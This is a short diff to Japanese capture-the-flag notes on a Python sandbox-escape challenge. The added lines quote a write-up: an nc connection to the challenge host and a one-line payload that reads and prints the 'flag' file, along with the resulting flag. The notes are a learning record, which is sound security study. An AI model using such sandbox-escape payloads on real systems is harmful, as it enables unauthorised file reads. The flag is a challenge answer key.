@@ -28,3 +28,11 @@ Invalid inputvagrant@vagrant:~$
 - `os.system("ls -al")`はinvalid inputではじかれるのでこれっぽい
 - The Abyssを試したけどはじかれた
 - `'__class__'`は通るので、文字列は許容される
+
+# 解説みた
+```
+vagrant@vagrant:~$ nc pwn1.chal.ctf.westerns.tokyo 30001
+[][sys.stdout.write(open('flag').read())]
+TWCTF{go_to_next_challenge_running_on_port_30002}
+```
+- 第一段階はこれでOKらしい…たぶん頑張れば解けたなぁ。おぼえとこ。
